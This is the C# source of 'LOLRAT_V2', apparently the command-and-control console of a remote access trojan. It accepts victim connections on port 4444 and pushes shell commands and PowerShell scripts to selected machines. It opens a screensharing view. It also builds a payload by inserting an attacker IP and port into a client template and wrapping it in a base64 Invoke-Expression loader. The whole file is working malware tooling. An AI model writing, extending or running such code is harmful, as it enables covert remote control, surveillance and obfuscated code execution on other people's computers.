using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace LOLRAT_V2
{
    public partial class Form1 : Form
    {
        public Dictionary<string, TcpClient> _clients = new Dictionary<string, TcpClient>();
        public Dictionary<string, NetworkStream> _streams = new Dictionary<string, NetworkStream>();

        public Form1()
        {
            InitializeComponent();
            Main();
            txtCommand.KeyDown += txtCommand_KeyDown;
            comboBoxClients.SelectedIndexChanged += comboBoxClients_SelectedIndexChanged;
        }

        public void Log(string text)
        {
            string time = DateTime.Now.ToString("HH:mm:ss");
            txtLog.Text += $"[{time}] {text}{Environment.NewLine}";
        }

        void Main()
        {
            int port = 4444;
            TcpListener server = new TcpListener(IPAddress.Any, port);

            server.Start();
            Log($"C2 Server started on port {port}. Waiting for clients...");

            Thread serverThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        TcpClient client = server.AcceptTcpClient();
                        string clientKey = client.Client.RemoteEndPoint.ToString();

                        Log($"Client connected: {clientKey}");

                        _clients[clientKey] = client;
                        _streams[clientKey] = client.GetStream();

                        // Update the ComboBox with the new client
                        Invoke((MethodInvoker)(() => comboBoxClients.Items.Add(clientKey)));
                        if (comboBoxClients.SelectedItem == null)
                        {
                            comboBoxClients.SelectedItem = clientKey;
                        }

                        Thread clientThread = new Thread(() => HandleClient(clientKey));
                        clientThread.Start();
                    }
                    catch (Exception ex)
                    {
                        Log($"Error: {ex.Message}");
                    }
                }
            });

            serverThread.IsBackground = true;
            serverThread.Start();
        }

        void HandleClient(string clientKey)
        {
            try
            {
                NetworkStream stream = _streams[clientKey];
                byte[] buffer = new byte[1024];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string receivedData = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                    Log($"[{clientKey}] Client: {receivedData}");
                }
            }
            catch (Exception ex)
            {
                Log($"[{clientKey}] Client communication error: {ex.Message}");
            }
            finally
            {
                DisconnectClient(clientKey);
            }
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            if (comboBoxClients.SelectedItem == null)
            {
                Log("No client selected.");
                return;
            }

            string selectedClientKey = comboBoxClients.SelectedItem.ToString();
            if (_streams.TryGetValue(selectedClientKey, out NetworkStream stream) && stream.CanWrite)
            {
                string command = txtCommand.Text.Trim();
                if (!string.IsNullOrEmpty(command))
                {
                    byte[] commandBytes = Encoding.ASCII.GetBytes(command + Environment.NewLine);
                    stream.Write(commandBytes, 0, commandBytes.Length);
                    stream.Flush();
                    Log($"Command sent to {selectedClientKey}: {command}");
                    txtCommand.Clear();
                }
            }
            else
            {
                Log($"No stream available for client: {selectedClientKey}");
            }
        }

        private void txtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnExecute_Click(sender, e);
                e.SuppressKeyPress = true;
            }
        }

        private void comboBoxClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            string selectedClientKey = comboBoxClients.SelectedItem.ToString();
            Log($"Switched to client: {selectedClientKey}");
        }

        private void DisconnectClient(string clientKey)
        {
            if (_streams.TryGetValue(clientKey, out NetworkStream stream))
            {
                stream?.Close();
            }

            if (_clients.TryGetValue(clientKey, out TcpClient client))
            {
                client?.Close();
            }

            _streams.Remove(clientKey);
            _clients.Remove(clientKey);

            Invoke((MethodInvoker)(() => comboBoxClients.Items.Remove(clientKey)));
            Log($"Client disconnected: {clientKey}");

            if (comboBoxClients.Items.Count > 0)
            {
                comboBoxClients.SelectedIndex = 0;
            }
        }

        private void btnExecuteScript_Click(object sender, EventArgs e)
        {
            if (comboBoxClients.SelectedItem == null)
            {
                Log("No client selected.");
                return;
            }

            string selectedClientKey = comboBoxClients.SelectedItem.ToString();
            if (_streams.TryGetValue(selectedClientKey, out NetworkStream stream) && stream.CanWrite)
            {
                OpenFileDialog openFileDialog = new OpenFileDialog
                {
                    Filter = "PowerShell Scripts (*.ps1)|*.ps1",
                    Title = "Select a PowerShell script"
                };

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        string scriptContent = File.ReadAllText(openFileDialog.FileName);

                        // Log filename
                        Log("Selected script: " + openFileDialog.FileName.ToLower());

                        // Search for "param (" in the script to determine if it contains placeholders
                        bool hasPlaceholders = scriptContent.Contains("param (");
                        if (!scriptContent.Contains("param ("))
                        {
                            Log("Warning: The selected script does not contain any placeholders.");
                        }
                        else
                        {
                            // Find the first occurrence of "param (" and extract the parameters
                            int paramStart = scriptContent.IndexOf("param (");
                            int paramEnd = scriptContent.IndexOf(")", paramStart);
                            string paramBlock = scriptContent.Substring(paramStart, paramEnd - paramStart + 1);

                            // Log the parameters
                            Log("Script parameters: " + paramBlock);

                            // Split the parameters into individual lines for further processing
                            string[] paramLines = paramBlock.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                            // Log count of parameters
                            Log("Number of parameters: " + paramLines.Length);

                            foreach (string line in paramLines)
                            {
                                if (line.Contains("$"))
                                {
                                    // Get the parameter name
                                    string paramName = line.Trim().Split(' ')[0].Trim();
                                    // Split by $ sign
                                    string[] parts = paramName.Trim().Split('$');
                                    // Get the actual parameter name
                                    paramName = parts[1].Trim();
                                    // Log
                                    Log("Parameter name: " + paramName);

                                    // Get parameter value from line
                                    string paramValue = line.Trim().Split(' ')[2].Trim();
                                    // Get content inside of quotes
                                    paramValue = paramValue.Split("\"")[1];
                                    // Log
                                    Log("Parameter value: " + paramValue);

                                    // Replace placeholders with actual arguments
                                    string argument = PromptForArgument(paramName);
                                    scriptContent = scriptContent.Replace(paramValue, argument);
                                }
                            }
                            // Log success
                            Log("Script arguments replaced successfully.");
                        }

                        byte[] scriptBytes = Encoding.ASCII.GetBytes(scriptContent + Environment.NewLine);
                        stream.Write(scriptBytes, 0, scriptBytes.Length);
                        stream.Flush();
                        if (hasPlaceholders)
                        {
                            Log($"Script with replaced arguments sent to {selectedClientKey}: {openFileDialog.FileName}");
                        }
                        else
                        {
                            Log($"Script sent to {selectedClientKey}: {openFileDialog.FileName}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Error reading or sending script: {ex.Message}");
                    }
                }
            }
            else
            {
                Log($"No stream available for client: {selectedClientKey}");
            }
        }

        private string PromptForArgument(string argumentName)
        {
            string argument = Microsoft.VisualBasic.Interaction.InputBox(
                $"Enter a value for '{argumentName}':",
                "Script Argument",
                ""
            );

            return argument.Trim();
        }

        private void btnBuildPayload_Click(object sender, EventArgs e)
        {
            // Build payload based on settings (txtIP, txtPort, checkBoxRegistry)
            string ip = txtIP.Text.Trim();
            string port = txtPort.Text.Trim();
            string registry = checkBoxRegistry.Checked ? "true" : "false";

            // Create the payload based on template (client_template.ps1 in current directory)
            string templatePath = Path.Combine(Directory.GetCurrentDirectory(), "client_template.ps1");
            string payload = File.ReadAllText(templatePath)
                .Replace("ATTACKER_IP", ip)
                .Replace("ATTACKER_PORT", port);
            //.Replace("{{REGISTRY}}", registry);

            // Base64 encode the payload
            byte[] payloadBytes = Encoding.UTF8.GetBytes(payload);
            string base64Payload = Convert.ToBase64String(payloadBytes);

            // create new payload that executes the base64 encoded payload
            string finalPayload = @$"$base64 = '{base64Payload}'
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
Invoke-Expression $decoded
";

            // Save the payload to a file
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "PowerShell Scripts (*.ps1)|*.ps1",
                Title = "Save the generated payload"
            };
            // Set the default filename
            saveFileDialog.FileName = "payload.ps1";

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveFileDialog.FileName, finalPayload);
                Log("Payload saved to: " + saveFileDialog.FileName);
                // Show message box with the path to the saved payload
                MessageBox.Show("Payload saved to: " + saveFileDialog.FileName, "Payload Saved", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnScreensharing_Click(object sender, EventArgs e)
        {
            // Open a new form for screensharing, that just has a PictureBox and a button for taking screenshots and button for UDP listening
            Screensharing screensharing = new Screensharing(this, comboBoxClients.SelectedItem.ToString());
            screensharing.Show();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Close all client connections
            foreach (string clientKey in _clients.Keys)
            {
                DisconnectClient(clientKey);
            }
        }
    }
}
